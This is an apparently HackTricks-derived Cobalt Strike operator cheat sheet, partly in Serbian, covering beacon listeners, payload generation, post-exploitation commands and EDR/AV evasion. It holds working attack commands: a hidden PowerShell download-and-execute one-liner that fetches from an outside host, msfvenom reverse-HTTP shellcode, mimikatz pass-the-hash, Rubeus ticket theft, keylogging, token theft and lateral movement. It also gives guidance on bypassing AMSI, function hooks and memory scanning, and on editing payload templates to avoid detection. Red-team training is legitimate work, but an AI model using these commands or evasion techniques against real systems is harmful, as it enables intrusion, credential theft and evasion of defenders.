# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` then you can select where to listen, which kind of beacon to use (http, dns, smb...) and more.

### Peer2Peer Listeners

The beacons of these listeners don't need to talk to the C2 directly, they can communicate to it through other beacons.

`Cobalt Strike -> Listeners -> Add/Edit` then you need to select the TCP or SMB beacons

* The **TCP beacon will set a listener in the port selected**. To connect to a TCP beacon use the command `connect <ip> <port>` from another beacon
* The **smb beacon will listen in a pipename with the selected name**. To connect to a SMB beacon you need to use the command `link [target] [pipe]`.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** for HTA files
* **`MS Office Macro`** for an office document with a macro
* **`Windows Executable`** for a .exe, .dll orr service .exe
* **`Windows Executable (S)`** for a **stageless** .exe, .dll or service .exe (better stageless than staged, less IoCs)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` This will generate a script/executable to download the beacon from cobalt strike in formats such as: bitsadmin, exe, powershell and python

#### Host Payloads

If you already has the file you want to host in a web sever just go to `Attacks -> Web Drive-by -> Host File` and select the file to host and web server config.

### Beacon Options

<details>
<summary>Opcije i komande za beacon</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # This uses the highest supported powershell version (not oppsec)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket in the attacker machine from a poweshell session & load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump insteresting ticket by luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   wmi lateral movement with msbuild inline c# task (oppsec)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On metaploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Prilagođeni implanti / Linux Beacons

- Prilagođeni agent treba samo da govori Cobalt Strike Team Server HTTP/S protokol (default malleable C2 profile) da bi se registrovao/check-in i primao zadatke. Implementirajte iste URIs/headers/metadata crypto definisane u profilu da biste ponovo koristili Cobalt Strike UI za tasking i output.
- Aggressor Script (npr. `CustomBeacon.cna`) može obaviti generisanje payload-a za non-Windows beacon tako da operatori mogu izabrati listener i proizvoditi ELF payload-e direktno iz GUI-ja.
- Primer Linux task handler-a izloženih Team Server-u: `sleep`, `cd`, `pwd`, `shell` (exec arbitrary commands), `ls`, `upload`, `download`, i `exit`. Oni odgovaraju task ID-jevima koje Team Server očekuje i moraju biti implementirani server-side da vrate output u odgovarajućem formatu.
- BOF podrška na Linuxu se može dodati učitavanjem Beacon Object Files in-process uz [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) (takođe podržava Outflank-style BOF-ove), što omogućava modularni post-exploitation koji radi unutar konteksta/privilegija implanta bez spawn-ovanja novih procesa.
- Ugradite SOCKS handler u custom beacon da biste zadržali pivoting paritet sa Windows Beacons: kada operator pokrene `socks <port>` implant treba da otvori lokalni proxy koji rutira operator alate kroz kompromitovani Linux host u interne mreže.

## Opsec

### Execute-Assembly

The **`execute-assembly`** koristi **sacrificial process** i remote process injection da izvrši naznačeni program. Ovo je vrlo bučno jer za inject unutar procesa koriste se određeni Win API-ji koje svaki EDR prati. Međutim, postoje neki custom alati koji se mogu koristiti da se nešto učita u isti proces:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- U Cobalt Strike možete takođe koristiti BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

Agressor script `https://github.com/outflanknl/HelpColor` će kreirati `helpx` komandu u Cobalt Strike koja stavlja boje u komande označavajući da li su BOF-ovi (zeleno), Frok&Run (žuto) i slično, ili ProcessExecution, injection ili slično (crveno). To pomaže da se zna koje su komande diskretnije.

### Ponašaj se kao korisnik

Možete proveriti događaje poput `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`:

- Security EID 4624 - Proverite sve interactive logon-e da biste znali uobičajene radne sate.
- System EID 12,13 - Proverite frekvenciju shutdown/startup/sleep događaja.
- Security EID 4624/4625 - Proverite inbound validne/invalidne NTLM pokušaje.
- Security EID 4648 - Ovaj event nastaje kada se koriste plaintext kredencijali za logon. Ako ga proces generiše, binary potencijalno ima kredencijale u clear text-u u config fajlu ili unutar koda.

Kada koristite `jump` iz cobalt strike, bolje je koristiti `wmi_msbuild` metodu da novi proces izgleda legitimnije.

### Koristite computer accounts

Često odbrambeni timovi filtriraju čudna ponašanja generisana od korisnika i **isključuju service accounts i computer accounts kao `*$` iz njihovog monitoringa**. Možete koristiti te naloge za lateral movement ili privilege escalation.

### Koristite stageless payload-e

Stageless payload-i su manje bučni od staged jer ne moraju da preuzimaju drugi stage sa C2 servera. To znači da ne generišu dodatni network traffic nakon inicijalne konekcije, što ih čini manje verovatnim za detekciju od strane mrežnih odbrana.

### Tokens & Token Store

Budite oprezni kada kradete ili generišete tokene jer može biti moguće da EDR izlista sve tokene svih thread-ova i pronađe **token koji pripada drugom korisniku** ili čak SYSTEM u procesu.

Zato je korisno čuvati tokene **po beacon-u** tako da nije potrebno krasti isti token iznova i iznova. Ovo je korisno za lateral movement ili kada treba više puta iskoristiti ukradeni token:

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

Prilikom lateralnog pomeranja obično je bolje **ukrasti token nego generisati novi** ili izvesti pass the hash napad.

### Guardrails

Cobalt Strike ima feature nazvan **Guardrails** koji pomaže da se spreči upotreba određenih komandi ili akcija koje bi mogle biti detektovane od strane odbrambenih timova. Guardrails se mogu konfigurisati da blokiraju specifične komande, kao što su `make_token`, `jump`, `remote-exec`, i druge koje se često koriste za lateral movement ili privilege escalation.

Pored toga, repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) takođe sadrži neke provere i ideje koje biste mogli razmotriti pre izvršavanja payload-a.

### Tickets encryption

U AD okruženju pazite na enkripciju tiketa. Po defaultu, neki alati će koristiti RC4 enkripciju za Kerberos tikete, što je manje sigurno od AES enkripcije, a savremena okruženja po defaultu koriste AES. Ovo može biti detektovano od strane odbrambenih timova koji prate za slabe enkripcijske algoritme.

### Avoid Defaults

Kada koristite Cobalt Stricke, po defaultu SMB pipe-ovi će imati ime `msagent_####` i `"status_####`. Promenite ta imena. Moguće je proveriti nazive postojećih pipe-ova iz Cobal Strike sa komandom: `ls \\.\pipe\`

Pored toga, sa SSH sesijama se kreira pipe nazvan `\\.\pipe\postex_ssh_####`. Promenite ga sa `set ssh_pipename "<new_name>";`.

Takođe u postex exploitation attack pipe-ovi `\\.\pipe\postex_####` mogu biti modifikovani sa `set pipename "<new_name>"`.

U Cobalt Strike profilima takođe možete menjati stvari poput:

- Izbegavanje korišćenja `rwx`
- Kako process injection ponašanje radi (koji API-ji će biti korišćeni) u `process-inject {...}` bloku
- Kako "fork and run" radi u `post-ex {…}` bloku
- Vremena spavanja (sleep time)
- Max veličine binarnih fajlova koji se učitavaju u memoriju
- Memorijski otisak i sadržaj DLL-a sa `stage {...}` blokom
- Network traffic

### Bypass memory scanning

Neki EDR-i skeniraju memoriju za poznate malware signeture. Coblat Strike dozvoljava modifikaciju `sleep_mask` funkcije kao BOF koji će moći da enkriptuje backdoor u memoriji.

### Noisy proc injections

Kada se ubacuje kod u proces ovo je obično veoma bučno, jer **regularni procesi obično ne rade ovu akciju i načini da se to postigne su ograničeni**. Stoga, može biti detektovano od strane behavior-based detection sistema. Štaviše, može biti detektovano i od strane EDR-a koji skeniraju mrežu za **thread-ove koji sadrže kod koji nije na disku** (iako procesi kao što su browser-i koristeći JIT to često imaju). Primer: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

Kada spawn-ujete novi proces važno je da **održite regularan parent-child** odnos između procesa kako biste izbegli detekciju. Ako svchost.exec izvršava iexplorer.exe to će izgledati sumnjivo, jer svchost.exe nije roditelj iexplorer.exe u normalnom Windows okruženju.

Kada se novi beacon spawn-uje u Cobalt Strike po defaultu se kreira process koji koristi **`rundll32.exe`** da pokrene novi listener. Ovo nije mnogo stealthy i može biti lako detektovano od strane EDR-a. Štaviše, `rundll32.exe` se pokreće bez argumenata što ga čini još sumnjivijim.

Sa sledećom Cobalt Strike komandom možete specificirati drugi proces za spawn novog beacon-a, čineći ga manje detektabilnim:
```bash
spawnto x86 svchost.exe
```
Takođe možete promeniti ovu postavku **`spawnto_x86` i `spawnto_x64`** u profilu.

### Proxyiranje saobraćaja napadača

Napadači će ponekad morati da pokreću alate lokalno, čak i na Linux mašinama, i da usmere saobraćaj žrtava ka tom alatu (npr. NTLM relay).

Štaviše, ponekad je za izvođenje pass-the.hash ili pass-the-ticket napada prikladnije da napadač **doda taj hash ili ticket u sopstveni LSASS proces** lokalno i zatim pivota sa njega, umesto da modifikuje LSASS proces na mašini žrtve.

Međutim, morate biti **pažljivi sa generisanim saobraćajem**, jer iz backdoor procesa možete slati neuobičajen saobraćaj (kerberos?). Zbog toga možete pivotirati na proces browsera (iako možete biti otkriveni pri injektovanju u proces, pa razmislite o prikrivenom načinu za to).


### Izbegavanje AV-a

#### AV/AMSI/ETW Bypass

Pogledajte stranicu:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Obično u `/opt/cobaltstrike/artifact-kit` možete naći kod i predkompajlirane šablone (u `/src-common`) payloads koje Cobalt Strike koristi za generisanje binarnih beacons.

Korišćenjem [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) sa generisanim backdoor-om (ili samo sa kompajliranim šablonom) možete pronaći šta izaziva pokretanje defender-a. Obično je to string. Zato možete promeniti kod koji generiše backdoor tako da taj string ne bude prisutan u finalnom binary-u.

Nakon izmene koda pokrenite `./build.sh` iz istog direktorijuma i kopirajte `dist-pipe/` folder u Windows klijenta u `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Ne zaboravite da učitate agresivan skript `dist-pipe\artifact.cna` da naznačite Cobalt Strike-u da koristi resurse sa diska koje želimo, a ne one koje je učitao.

#### Resource Kit

Folder ResourceKit sadrži šablone za Cobalt Strike-ove script-based payloads, uključujući PowerShell, VBA i HTA.

Korišćenjem [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) sa šablonima možete otkriti šta defender (u ovom slučaju AMSI) ne voli i izmeniti to:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Modifikovanjem detektovanih linija moguće je generisati template koji neće biti otkriven.

Ne zaboravite da učitate aggressive script `ResourceKit\resources.cna` da biste Cobalt Strike-u naznačili da koristi resurse sa diska koje želimo, a ne one već učitane.

#### Function hooks | Syscall

Function hooking je veoma česta metoda ERDs za detekciju malicioznog ponašanja. Cobalt Strike omogućava da zaobiđete ove hook-ove korišćenjem **syscalls** umesto standardnih Windows API poziva koristeći **`None`** config, ili korišćenjem `Nt*` verzije funkcije sa **`Direct`** podešavanjem, ili jednostavno preskakanjem `Nt*` funkcije pomoću opcije **`Indirect`** u malleable profile-u. U zavisnosti od sistema, jedna opcija može biti prikrivenija od druge.

Ovo se može podesiti u profile-u ili koristeći komandu **`syscall-method`**.

Međutim, ovo može biti i bučno.

Jedna od opcija koje Cobalt Strike nudi za zaobilaženje function hook-ova jeste uklanjanje tih hook-ova pomoću: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

Takođe možete proveriti koje su funkcije hook-ovane koristeći [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) ili [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>Razne Cobalt Strike komande</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## Izvori

- [Cobalt Strike Linux Beacon (custom implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [Outflank nix BOF template](https://github.com/outflanknl/nix_bof_template)
- [Unit42 analysis of Cobalt Strike metadata encryption](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [SANS ISC diary on Cobalt Strike traffic](https://isc.sans.edu/diary/27968)
- [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)

{{#include ../banners/hacktricks-training.md}}
